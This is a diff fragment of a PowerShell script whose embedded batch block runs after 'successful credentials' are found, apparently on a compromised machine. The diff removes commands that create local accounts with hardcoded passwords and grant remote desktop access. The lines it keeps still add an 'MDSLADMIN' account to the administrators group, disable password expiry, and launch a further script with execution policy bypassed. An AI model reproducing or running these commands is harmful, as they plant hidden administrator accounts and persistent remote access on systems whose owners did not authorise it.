@@ -110,11 +110,7 @@ if ($successfulCredentials.Count -gt 0) {
                     @echo off
                     cls
                     setlocal enabledelayedexpansion
-                    net user MDSLUSER Matahari123 /add
-                    net localgroup "remote desktop users" MDSLUSER /ADD
                     net accounts maxpwage:unlimited
-                    net user MDSLADMIN S3cr3tP@ssw0rd /add
-                    net user MDSLADMIN S3cr3tP@ssw0rd 
                     net localgroup "administrators" MDSLADMIN /ADD 
                     net accounts maxpwage:unlimited
                     start powershell.exe -executionpolicy bypass -noprofile -file "$folderPath_4869\ProgramGUI_v2.ps1"
